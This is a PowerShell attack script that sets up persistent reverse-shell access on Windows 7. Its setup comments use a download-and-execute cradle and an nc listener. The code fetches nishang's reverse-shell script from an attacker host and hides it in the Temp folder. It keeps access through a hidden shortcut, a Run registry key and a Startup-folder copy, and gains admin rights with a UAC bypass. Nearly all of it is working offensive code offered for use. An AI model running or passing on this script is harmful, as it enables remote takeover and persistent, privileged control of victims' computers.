#### Windows Auto Persistence ####
# Tested on Windows 7 Professional 32-Bits

## Setup ##
# Download this files:
# -> https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
# -> https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1
# Start a Python http server -> python -m http.server 80
# Listen on <LPORT> to recieve the Reverse Shell -> nc -nlvp <LPORT>
# Run this script from a cmd.exe (You may need to press <Enter> a couple of times) -> powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Win_Auto_Persistence.ps1')
# Remember to change LHOST and LPORT to your attacker IP and the listening port for the Reverse Shell

$LHOST = "192.168.1.64"
$LPORT = "443"

## Non privileged persistence ##
# Username
$user = $Env:UserName
# Downloading the Reverse Shell -> "Invoke-PowerShellTcp.ps1"
(New-Object Net.WebClient).DownloadString("http://$LHOST/Invoke-PowerShellTcp.ps1") > C:\Users\$user\AppData\Local\Temp\apwrs.ps1
"Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port $LPORT" >> C:\Users\$user\AppData\Local\Temp\apwrs.ps1

# Creating a Shortcut to run the Reverse Shell
$TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Path = "C:\Users\$user\AppData\Local\Temp\apwrs.lnk"

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($Path)
$Shortcut.TargetPath = $TargetPath
$Shortcut.Arguments = "-noprofile -executionpolicy bypass -windowstyle hidden -file C:\Users\$user\AppData\Local\Temp\apwrs.ps1"
$Shortcut.WindowStyle = 2
$Shortcut.Save()

# Adding the register key to auto run the Reverse Shell on user login
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v apwrs /t REG_SZ /d "C:\Users\$user\AppData\Local\Temp\apwrs.lnk"
# Creating a copy on the user Startup folder
Copy-Item -Path "C:\Users\$user\AppData\Local\Temp\apwrs.lnk" -Destination "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

## UAC Bypass 
# Downloading and sending the privileged Reverse Shell -> "Invoke-PsUACme.ps1"
(New-Object Net.WebClient).DownloadString("http://$LHOST/Invoke-PsUACme.ps1") > C:\Users\$user\AppData\Local\Temp\ubprs.ps1
"Invoke-PsUACme -method oobe -Payload 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -file C:\Users\$user\AppData\Local\Temp\apwrs.ps1'" >> C:\Users\$user\AppData\Local\Temp\ubprs.ps1
Start-Process powershell -ArgumentList '-noprofile -executionpolicy bypass -windowstyle hidden -file C:\Users\Nico\AppData\Local\Temp\ubprs.ps1'
# Check privileges -> (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
